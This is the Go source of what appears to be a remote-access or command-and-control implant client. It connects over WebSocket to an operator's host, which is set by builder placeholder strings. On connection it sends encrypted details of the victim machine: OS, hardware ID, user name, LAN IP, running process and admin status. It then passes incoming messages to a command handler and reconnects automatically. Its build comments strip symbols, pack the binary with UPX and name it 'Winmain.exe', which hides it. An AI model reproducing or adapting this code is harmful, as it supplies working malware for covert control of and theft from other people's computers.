package main

import (
	"main/Encrypt"
	"main/HandlePacket"
	"main/MessagePack"
	"main/PcInfo"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/togettoyou/wsc"
	"golang.org/x/sys/windows/registry"
)

type Client struct {
	Connection *wsc.Wsc
	lock       sync.Mutex // 加入一个锁
}

func (c *Client) SendData(data []byte) {
	endata, err := Encrypt.Encrypt(data)
	if err != nil {
		return
	}
	c.Connection.SendBinaryMessage(endata)
}
func SendInfo() []byte {
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientInfo")

	msgpack.ForcePathObject("OS").SetAsString(PcInfo.GetOSVersion())
	msgpack.ForcePathObject("HWID").SetAsString(PcInfo.GetHWID())

	msgpack.ForcePathObject("User").SetAsString(PcInfo.GetUserName())
	msgpack.ForcePathObject("LANip").SetAsString(PcInfo.GetInternalIP())
	msgpack.ForcePathObject("ProcessName").SetAsString(PcInfo.GetProcessName())

	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	msgpack.ForcePathObject("SleepTime").SetAsString("10")
	msgpack.ForcePathObject("RemarkMessage").SetAsString(PcInfo.RemarkContext)
	msgpack.ForcePathObject("RemarkClientColor").SetAsString(PcInfo.RemarkColor)

	msgpack.ForcePathObject("Admin").SetAsString(PcInfo.IsAdmin())
	msgpack.ForcePathObject("CLRVersion").SetAsString("1.0")
	msgpack.ForcePathObject("Group").SetAsString(PcInfo.GroupInfo)
	msgpack.ForcePathObject("ClientComputer").SetAsString(PcInfo.GetClientComputer())
	//println(string(msgpack.Encode2Bytes()))
	msgpack.ForcePathObject("WANip").SetAsString("0.0.0.0")
	return msgpack.Encode2Bytes()
}

func (c *Client) Connect(url string) {
	runtime.GC()
	done := make(chan bool)
	c.Connection = wsc.New(url)
	// 可自定义配置，不使用默认配置
	c.Connection.SetConfig(&wsc.Config{
		// 写超时
		WriteWait: 10 * time.Second,
		// 支持接受的消息最大长度，默认512字节
		MaxMessageSize: 1024 * 1024 * 10,
		// 最小重连时间间隔
		MinRecTime: 2 * time.Second,
		// 最大重连时间间隔
		MaxRecTime: 60 * time.Second,
		// 每次重连失败继续重连的时间间隔递增的乘数因子，递增到最大重连时间间隔为止
		RecFactor: 1.5,
		// 消息发送缓冲池大小，默认256
		MessageBufferSize: 10240 * 10,
	})
	// 设置回调处理
	c.Connection.OnConnected(func() {
		//log.Println("connected!")
		c.SendData(SendInfo())
	})
	c.Connection.OnConnectError(func(err error) {
		//log.Println("connect error!")
	})
	c.Connection.OnDisconnected(func(err error) {
		//log.Println("disconnected!")
	})
	c.Connection.OnClose(func(code int, text string) {
		//log.Println("close!")
		done <- true
	})
	c.Connection.OnTextMessageSent(func(message string) {
		//log.Println("text_message_sent:" + message)
	})
	c.Connection.OnBinaryMessageSent(func(data []byte) {
		//log.Println("binary_message_sent: ", string(data))
	})
	c.Connection.OnSentError(func(err error) {
		//log.Println("sent_error: " + err.Error())
	})
	c.Connection.OnPingReceived(func(appData string) {
		//log.Println("ping: ", appData)
		runtime.GC()
	})
	c.Connection.OnPongReceived(func(appData string) {
		//log.Println("pong: ", appData)
	})
	c.Connection.OnTextMessageReceived(func(message string) {
		//log.Println("text_message_received: ", message)
	})
	c.Connection.OnBinaryMessageReceived(func(data []byte) {
		//log.Println("binary_message_received: ", string(data))
		HandlePacket.Read(data, c.Connection)
	})
	// 开始连接
	go c.Connection.Connect()
	//go controller.Start()
	for {
		select {
		case <-done:
			return
		}
	}
}

func run_main(Host string) {
	client := &Client{}
	client.Connect(Host)
}
func checkDotNetFramework40() bool {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full`, registry.QUERY_VALUE)
	if err != nil {
		return false
	}
	defer key.Close()
	release, _, err := key.GetIntegerValue("Release")
	if err != nil {
		return false
	}
	return release >= 378389
}

// var host = "192.168.8.123" // assuming for the sake of example
// var port = "4000"

var ClientWorking bool

func main() {

	//release
	Host := "HostAAAABBBBCCCCDDDD"
	Port := "PortAAAABBBBCCCCDDDD"
	ListenerName := "ListenNameAAAABBBBCCCCDDDD"
	route := "RouteAAAABBBBCCCCDDDD"
	PcInfo.Host = strings.ReplaceAll(Host, " ", "")
	PcInfo.Port = strings.ReplaceAll(Port, " ", "")
	PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
	PcInfo.IsDotNetFour = checkDotNetFramework40()
	///Debug
	// Host := "192.168.1.250"
	// Port := "80"
	// PcInfo.ListenerName = "dawd"
	// route := "www"

	//url := "ws://127.0.0.1:80/Echo"
	url := "ws://" + Host + ":" + Port + "/" + route
	url = strings.ReplaceAll(url, " ", "")
	run_main(url)
}

//cmd:
//Linux：
//set GOOS=linux
//set GOARCH=amd64

//windows:
//set GOOS=windows
//set GOARCH=amd64

//powershell:
//Linux:
//$env:GOOS="linux"
//$env:GOARCH="amd64"
//Windows:
//$env:GOOS="windows"
//$env:GOARCH="amd64"

//CGO_ENABLED=0 GOOS=linux go build -a -ldflags="-s -w" -installsuffix cgo -o Winmain.exe main.go && upx -9 Client
//set GOARCH=mips
//set GOOS=linux

//MacOS
//set GOOS=darwin
//set GOARCH=amd64
